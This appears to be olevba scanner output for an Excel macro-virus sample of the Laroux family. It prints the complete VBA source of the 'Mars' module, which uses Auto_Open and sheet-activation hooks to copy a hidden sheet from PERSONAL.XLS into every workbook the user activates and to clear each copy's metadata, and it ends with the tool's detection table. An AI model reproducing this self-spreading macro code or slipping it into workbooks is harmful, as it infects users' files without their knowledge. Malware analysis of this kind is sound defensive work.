olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-65f47c093de43e37b50c111051059e815517f482
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Mars.bas 
in file: Virus.MSExcel.Laroux-based-65f47c093de43e37b50c111051059e815517f482 - OLE stream: '_VBA_PROJECT_CUR/VBA/Mars'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 








Public AllOkey
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "Auto_Search"
End Sub

Sub Auto_Search()
Attribute Auto_Search.VB_ProcData.VB_Invoke_Func = " \n14"
    AuLoad$ = "PERSONAL.XLS"
    AuName$ = "Mars"
    AcName$ = ActiveWorkbook.Name
    AsName$ = Workbooks(AcName$).Sheets(1).Name
    If ActiveWorkbook.Modules.Count = 0 Then
        If Not AsName$ = AuName$ Then
            Application.ScreenUpdating = False
            Workbooks(AuLoad$).Sheets(AuName$).Copy Before:= _
            Workbooks(AcName$).Sheets(1)
            Workbooks(AcName$).Sheets(AuName$).Visible = False
            Application.ScreenUpdating = True
            Application.OnSheetActivate = AuLoad$ + "!" + "Auto_Search"
        End If
    ElseIf Not AllOkey Then
        AcPath$ = ActiveWorkbook.Path
        AsPath$ = Application.StartupPath
        AsFind$ = Dir(AsPath$ & "/" & AuLoad$)
        AllOkey = True
        If AsFind$ <> AuLoad$ Then
            Application.ScreenUpdating = False
            Sheets(AuName$).Visible = True
            Sheets(AuName$).Select
            Sheets(AuName$).Copy
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            AcCopy$ = ActiveWorkbook.Name
            AcPath$ = CurDir()
            ChDir AsPath$

            ChDir AcPath$
            Workbooks(AcName$).Sheets(AuName$).Visible = False
            Application.ScreenUpdating = True
            Application.OnSheetActivate = AuLoad$ + "!" + "Auto_Search"
        End If
    End If
End Sub
'                                           Bengkalis, 10 Januari 1997

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Mar
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

